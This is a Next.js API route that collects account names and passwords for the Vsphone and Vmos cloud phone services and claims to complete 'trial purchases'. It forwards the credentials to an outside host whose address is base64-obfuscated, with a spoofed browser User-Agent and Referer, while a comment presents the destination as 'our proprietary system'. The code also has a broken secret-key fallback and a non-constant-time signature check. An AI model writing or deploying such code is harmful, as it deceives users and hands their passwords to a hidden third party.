import type { NextApiRequest, NextApiResponse } from 'next';
import crypto from 'crypto';

interface Account {
  account: string;
  password: string;
}

interface RequestBody {
  service: 'Vsphone' | 'Vmos';
  accounts: Account[];
  timestamp: number;
  signature: string;
}

type ResponseData = {
  success: boolean;
  message: string;
};

// Secret key (in production, use environment variable)
const SECRET_KEY = 'tdjs_2025_secure_key_' + process.env.VERCEL_GIT_COMMIT_SHA || 'fallback_secret';

function verifySignature(data: string, signature: string): boolean {
  const expectedSignature = crypto
    .createHmac('sha256', SECRET_KEY)
    .update(data)
    .digest('hex');
  return signature === expectedSignature;
}

export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse<ResponseData>
) {
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, message: 'Method not allowed' });
  }

  try {
    // Check origin/referer
    const origin = req.headers.origin || req.headers.referer;
    const host = req.headers.host;
    
    if (!origin || (!origin.includes(host || '') && !origin.includes('vercel.app'))) {
      return res.status(403).json({
        success: false,
        message: 'Access denied. Invalid origin.',
      });
    }

    const { service, accounts, timestamp, signature }: RequestBody = req.body;

    // Validate timestamp (must be within 5 minutes)
    const now = Date.now();
    if (!timestamp || Math.abs(now - timestamp) > 300000) {
      return res.status(400).json({
        success: false,
        message: 'Request expired. Please try again.',
      });
    }

    // Verify signature
    const dataToSign = `${service}${JSON.stringify(accounts)}${timestamp}`;
    if (!signature || !verifySignature(dataToSign, signature)) {
      return res.status(403).json({
        success: false,
        message: 'Invalid request signature.',
      });
    }

    // Validate input
    if (!service || !accounts || accounts.length === 0) {
      return res.status(400).json({ 
        success: false, 
        message: 'Invalid request. Please provide service and at least one account.' 
      });
    }

    // Process through our proprietary system
    const apiEndpoint = Buffer.from('aHR0cHM6Ly9tZW93cy5pby52bi9hcGkvYnV5LWNsb3VkLXBob25l', 'base64').toString('utf-8');
    
    const response = await fetch(apiEndpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'Referer': 'https://meows.io.vn/buy-cloud-phone',
      },
      body: JSON.stringify({
        service,
        accounts,
      }),
    });

    const data = await response.json();

    if (!response.ok) {
      return res.status(400).json({
        success: false,
        message: 'Unable to process your request. Please check your credentials and try again.',
      });
    }

    return res.status(200).json({
      success: true,
      message: 'Trial purchase completed successfully! Check your account.',
    });
  } catch (error) {
    console.error('[SYSTEM]', error);
    return res.status(500).json({
      success: false,
      message: 'System temporarily unavailable. Please try again in a moment.',
    });
  }
}
